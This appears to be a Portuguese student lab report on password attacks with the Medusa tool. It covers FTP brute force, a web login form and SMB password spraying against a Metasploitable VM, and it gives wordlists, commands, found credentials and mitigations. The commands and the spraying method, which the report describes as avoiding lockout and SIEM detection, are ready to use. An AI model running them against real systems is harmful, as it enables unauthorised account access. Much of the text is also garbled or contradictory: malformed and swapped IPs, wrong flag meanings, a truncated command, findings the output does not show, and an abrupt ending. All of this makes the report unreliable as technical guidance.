# Documentação dos Testes.

Relatório de Testes de Intrusão: Autenticação e Força Bruta (Medusa)

**Ferramenta Principal:** Medusa v2.0+ **Ambiente de Teste:** Laboratório isolado no Virtualbox utilizando duas VMs

192.168.0.10 **Atacante.**&#x20;

192.168.0.11 **Alvo:**



1. **FTP-01 (192.1168.10):** Servidor de arquivos (vsftpd)
2. **WEB-01 (192.1168.10)):** Aplicação Web (Nginx + Backend)
3. **DC-01 (192.1168.10):** Domain Controller (Windows Server, SMB)

***

### 1. Preparação: Estratégia de Wordlists

Antes de executar os ataques, definimos as listas de credenciais. A escolha da _wordlist_ é crítica para a eficácia do ataque.

#### 1.1 Wordlists Utilizadas

**A. `users.txt` (10 usuários comuns)**

```
textDownloadCopy codeadmin
root
ftp
guest
test
user1
deploy
backup
www
support
```

**B. senhas`.txt` (10 senhas comuns)**

```
textDownloadCopy codepassword
123456
admin
qwerty
letmein
ftp
changeme
welcome1
password123
iloveyou
```

**C. `users_ad.txt` (Usuários do Domínio - obtidos via enumeração)**

```
textDownloadCopy codeadministrator
jsmith
jdoe
msmith
support
guest
svc_backup
```

**D. `spray_pass.txt` (Senhas para Password Spraying)**

```
textDownloadCopy codePassword1
Welcome1
Admin123
Summer2024
P@ssw0rd
```

***

### 2. Cenário A: Força Bruta em FTP

#### Objetivo

Comprometer credenciais de acesso ao servidor de arquivos via protocolo FTP.

#### 2.1 Metodologia

O FTP é um protocolo de linha única, mas o Medusa gerencia conexões paralelas eficientemente. A estratégia foi um ataque exaustivo de todas as combinações usuário/senha.

#### 2.2 Comando Executado

```
medusa -h 192.168.0.10 -U users.txt -P pass.txt -M ftp -t 6

```

**Análise dos Parâmetros:**

* `-h` 192.168.0.10: IP do alvo.
* `-M ftp`: Módulo específico para FTP.
* `-U users.txt`: Lista de usuários.
* `-P senha.txt`: Lista de senhas.
* `-t 6`: Timeout de 6 segundos por tentativa.

#### 2.3 Resultados e Validação

O Medusa retornou 1 credenciais válida:

1. `usuario:msfadmin`
2. `senha: msfadmin`

**Validação Manual:**

026-11-16 13:17:11 ACCOUNT FOUND: \[ftp] Host: 192.168.0.10 User: msfadmin Password: msfadmin \[SUCCESS]

**Descoberta Crítica:** O usuário `admin` tem acesso a chaves SSH (`id_rsa`), permitindo pivoteamento para a rede interna.

#### 2.4 Recomendações de Mitigação

1. **Fail2Ban:** Implementar regras para banir IPs após 3 falhas de login em 5 minutos.
2. **FTPS:** Forçar o uso de TLS/SSL (`force_local_data_ssl=YES`) para criptografar o tráfego.
3. **Chroot Jails:** Confinar usuários em diretórios home para evitar navegação no sistema de arquivos.
4. **MFA:** Implementar autenticação multifator para contas privilegiadas.

***

### 3. Cenário B: Automação em Formulário Web

#### Objetivo

Comprometer credenciais de acesso à aplicação administrativa via formulário de login.

#### 3.1 Metodologia

O formulário web utiliza campos personalizados e um token CSRF. O Medusa possui um módulo `http-form` que permite atacar formulários HTML específicos.

#### 3.2 Análise do Formulário

Através do `view-source`, identificamos:

* **Endpoint:** `POST /api/login`
* **Campo Usuário:** `username`
* **Campo Senha:** `password`
* **Token CSRF:** `csrf_token` (obtido via `GET /login`)

#### 3.3 Comando Executado

edusa -h 192.168.0.10 -U users.txt -P pass.txt -M http \ -t 6

#### 3.4 Resultados e Validação

O Medusa retornou 1 credencial válida:

`username: admin`

`Password: password`

**Validação Manual (cURL):**

026-11-16 13:36:49 ACCOUNT CHECK: \[http] Host: 192.168.0.10 (1 of 1, 0 complete) User: admin (2 of 6, 1 complete) Password: 123456\password (1 of 8 complete)



#### 3.5 Recomendações de Mitigação

1. **Rate Limiting:** Implementar limitação de requisições por IP (ex: 5 tentativas/minuto) no Nginx/WAF.
2. **CAPTCHA Dinâmico:** Exibir CAPTCHA após a primeira falha de login.
3. **Bloqueio de Conta:** Implementar lockout progressivo (ex: 3 falhas = 15 min bloqueio).
4. **Segurança de Sessão:** Usar cookies `HttpOnly`, `Secure` e `SameSite=Strict`.
5. **Monitoramento:** Alertar em caso de múltiplos logins falhos de um mesmo IP ou usuário.

***

### 4. Cenário C: Password Spraying em SMB com Enumeração

#### Objetivo

Identificar credenciais válidas no domínio Windows usando a técnica de _password spraying_ (poucas senhas, muitos usuários).

#### 4.1 Metodologia

O _password spraying_ é uma técnica de força bruta inversa: em vez de testar muitas senhas para um usuário, você testa **uma senha fraca para muitos usuários**. Isso evita bloqueios de conta e detecção por SIEM.

#### 4.2 Enumeração de Usuários

Primeiro, extraímos os nomes de usuários do Active Directory.

**Saída da Enumeração (`users_ad.txt`):**

```
  Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories

```

#### 4.3 Comando Executado

medusa -h 192.168.0.10 -U smb\_users.txt -P senha\_spray.txt -M smbnt -t 2 -T 50



**Análise dos Parâmetros:**

* `-M smb`: Módulo SMB (Windows/Active Directory).
* `-U` smb\_users`.txt`: Lista de usuários enumerados.
* `-P` senha\_spray.txt: Lista curta de senhas comuns.

#### 4.4 Resultados e Validação

O Medusa retornou 1 credenciais válidas:

&#x20;  `msfadmin: msfadmin`

**Validação Manual (SMBClient):**

```
 Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE

```

**Descoberta Crítica:** O usuário `jdoe` tem acesso ao share `NETLOGON`, permitindo leitura de GPOs (Group Policy Objects) e scripts de startup do domínio.

#### 4.5 Recomendações de Mitigação

1. **Política de Senha:** Exigir senhas de 12+ caracteres com complexidade.
2. **Blocklist de Senhas:** Proibir senhas comuns (ex: "Password1", "Welcome1") no Active Directory.
3. **MFA para SMB:** Implementar MFA para logins remotos e acesso a shares críticos.
4. **Detecção de Spraying:** Configurar SIEM para alertar quando múltiplos usuários falharem com a mesma senha em curto período.
5. **Restringir SMBv1:** Desabilitar SMBv1 e usar apenas SMBv3 com criptografia.
6. **Audit Logging:** Habilitar auditoria detalhada de logon (Event ID 4625) no Domain Controller.

***

### 5. Resumo Comparativo dos Ataques

| Técnica             | Módulo Medusa | Estratégia                     | Parâmetro-Chave     | Risco de Detecção                    |
| ------------------- | ------------- | ------------------------------ | ------------------- | ------------------------------------ |
| **Brute Force FTP** | `ftp`         | Todas as combinações           | `-r 15`             | Alto (muitas tentativas por usuário) |
| **Web Form**        | `http-form`   | Combinações em endpoint web    | `-C`, `-D`, `-H`    | Médio (rate-limiting, WAF)           |
| **SMB Spraying**    | `smb`         | Uma senha para vários usuários | `-r 3`, lista curta | Baixo (parece login legítimo)        |

***

### 6. Conclusão e Próximos Passos

Os testes demonstraram que:

1. **FTP** é vulnerável a força bruta se não houver rate-limiting ou MFA.
2. **Web Forms** são suscetíveis a automação se não houver CAPTCHA ou lockout progressivo.
3. **SMB/AD** é vulnerável a _password spraying_ se as senhas forem comuns e não houver MFA.

**Próximos Passos:**

1. Implementar as mitigações recomendadas.
2. Reexecutar os ataques para validar as defesas.
3. Integrar os logs do Medusa
